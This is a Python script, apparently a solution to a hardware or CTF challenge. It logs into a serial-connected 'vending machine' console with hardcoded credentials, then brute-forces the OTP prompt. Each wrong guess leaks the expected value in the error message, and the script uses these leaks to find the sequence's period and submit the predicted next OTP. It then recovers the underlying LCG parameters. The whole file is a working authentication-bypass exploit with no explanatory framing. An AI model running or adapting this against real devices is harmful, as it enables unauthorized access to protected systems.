import serial
import time
import re
import math

PORT = "/dev/ttyUSB0"
BAUD = 115200
CNC_PASSWORD = "cncshneqqfaesmkhngtuakyiynloylukfsesdcpfsiuctxnxmykil"

ser = serial.Serial(PORT, BAUD, timeout=0.05)
time.sleep(2) 

# Method used to send values to the vending machine
def send_raw(text):
    print(f">>> sending: {text!r}")
    ser.write(text.encode())

# Method to read lines until one contains expected_substr (or it times out)
def read_until(expected_substr, timeout=10):
    end = time.time() + timeout
    lines = []
    while time.time() < end:
        line = ser.readline().decode(errors="ignore").strip()
        if line:
            print(line)
            lines.append(line)
            if expected_substr in line:
                return lines
    print(f"Timed out waiting for: {expected_substr!r}")
    return lines

# ------ Login process to get to OTP ------
read_until("vending machine")
send_raw("alancywupdjmydfadoaqvshshkgucnfwvvoqhjbxrdgndhfmhryjzn\n")
read_until("Password:")
send_raw(CNC_PASSWORD + "\n")
read_until("OTP:")

pattern = re.compile(r"was expecting (\d+)")

sequence = [] # Stores every leaked OTP value
seen = {} # Value -> first index it showed up at
attempt = 0
CONFIRM_LEN = 5 # How many consecutive values must match to call it a real repeat (to avoid any false positives)

def get_val(idx):
    return sequence[idx] if 0 <= idx < len(sequence) else None

period = None
j_match = None  # index that attempt matched against

with open("OTP_last_capture.txt", "w") as f:
    f.write("------ OTP brute-force transcript ------\n")

    while True:
        send_raw("100\n") # Dummy guess used in the bruteforcing, real value gets leaked in the error message
        lines = read_until("OTP:")

        expected_val = None
        for line in lines:
            f.write(f"{attempt}: {line}\n")
            f.flush()
            m = pattern.search(line)
            if m:
                expected_val = m.group(1)

        if expected_val is None:
            print("No 'was expecting' value found this round.")
            break

        sequence.append(expected_val)

        # check every possible period length against the last CONFIRM_LEN values
        found = False
        for j in range(max(0, attempt - 1500), attempt):
            cand_period = attempt - j
            if cand_period < 1:
                continue
            ok = True
            for k in range(CONFIRM_LEN):
                a_ = get_val(attempt - k)
                b_ = get_val(attempt - k - cand_period)
                if a_ is None or b_ is None or a_ != b_:
                    ok = False
                    break
            if ok:
                period = cand_period
                j_match = j
                found = True
                break

        if found:
            msg = f"> CONFIRMED period={period} (index {j_match} == index {attempt})"
            print(msg)
            f.write(msg + "\n")
            break

        seen.setdefault(expected_val, attempt)
        attempt += 1

    # sequence repeats every period steps, so next otp = sequence[len(sequence) - period]
    next_idx = len(sequence) - period
    predicted_next = sequence[next_idx]
    f.write(f"> Predicted next OTP (sequence[{next_idx}]): {predicted_next}\n")
    print(f"> Sending predicted next OTP: {predicted_next}")

    send_raw(predicted_next + "\n")
    final_response = read_until("Signed-By", timeout=5)
    f.write("------ Final response ------\n")
    for line in final_response:
        f.write(f"{line}\n")

    # recover LCG parameters from the captured sequence
    f.write("\n------ Recovered generator parameters ------\n")
    X = [int(v) for v in sequence]
    diffs = [X[i+1] - X[i] for i in range(len(X)-1)]

    m = 4096  # max value seen in previous attempts was exactly 4095 (4096 (2^12) - 1), assuming a modulus of 4096

    # Method to solve a*d0 = d1 (mod m), handling the case where d0 isn't invertible mod m
    def solve_a(d0, d1, m):
        g = math.gcd(d0, m)
        if d1 % g != 0:
            return []
        d0g, d1g, mg = d0 // g, d1 // g, m // g
        a0 = (d1g * pow(d0g, -1, mg)) % mg
        return [(a0 + k*mg) % m for k in range(g)]

    candidates = solve_a(diffs[0], diffs[1], m)

    # Pick candidates that correctly predicts more of the sequence, not just the first pair
    a = None
    for cand in candidates:
        if all((cand * diffs[i]) % m == diffs[i+1] % m for i in range(0, min(20, len(diffs)-1))):
            a = cand
            break

    if a is not None:
        c = (X[1] - a*X[0]) % m
        param_msg = f"LCG recovered: a={a}, c={c}, m={m}  (x_(n+1) = (a*x_n + c) mod m)"
    else:
        param_msg = f"Could not disambiguate 'a' among candidates: {candidates} (m={m})"

    print(param_msg)
    f.write(param_msg + "\n")